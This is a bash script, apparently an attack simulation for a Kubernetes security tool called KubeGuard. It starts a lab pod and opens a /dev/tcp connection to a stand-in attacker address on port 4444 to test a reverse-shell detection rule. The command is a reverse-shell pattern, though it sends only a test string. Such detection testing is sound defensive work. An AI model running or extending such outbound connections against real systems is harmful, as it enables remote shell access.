#!/bin/bash
# Reverse Shell Simulation
# This script simulates a reverse shell connection attempt

set -e

echo "=============================================="
echo "KubeGuard Attack Simulation: Reverse Shell"
echo "=============================================="

NAMESPACE="${NAMESPACE:-attacker-lab}"
POD_NAME="${POD_NAME:-reverse-shell}"
ATTACKER_IP="${ATTACKER_IP:-203.0.113.50}"
ATTACKER_PORT="${ATTACKER_PORT:-4444}"

echo ""
echo "[*] Creating test pod in namespace: $NAMESPACE"

kubectl create namespace $NAMESPACE --dry-run=client -o yaml | kubectl apply -f -

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: $POD_NAME
  namespace: $NAMESPACE
  labels:
    app: attacker-pod
    env: lab
spec:
  containers:
  - name: shell
    image: alpine:latest
    command: ["sleep", "3600"]
EOF

echo "[*] Waiting for pod to be ready..."
kubectl wait --for=condition=Ready pod/$POD_NAME -n $NAMESPACE --timeout=60s

echo ""
echo "[!] Simulating reverse shell connection..."
echo "[!] Target: $ATTACKER_IP:$ATTACKER_PORT"
echo "[!] This should trigger: Reverse Shell Indicators rule"
echo ""

# Simulate reverse shell - won't actually connect but will create the syscall
kubectl exec -n $NAMESPACE $POD_NAME -- sh -c "
  # Install netcat if available (this alone might trigger package manager rule)
  # Instead, just attempt connection with /dev/tcp simulation
  echo 'Attempting outbound connection...'
  # This uses bash's /dev/tcp which creates a socket
  timeout 2 sh -c 'echo test > /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT' 2>/dev/null || echo 'Connection attempt made (expected to fail)'
"

echo ""
echo "[*] Attack simulation completed. Check KubeGuard for alerts."
echo ""
echo "Expected:"
echo "  - Alert: Reverse Shell Indicators"
echo "  - Severity: critical"
echo "  - Response: kill_pod"
echo ""

echo "[*] To cleanup: kubectl delete pod $POD_NAME -n $NAMESPACE"
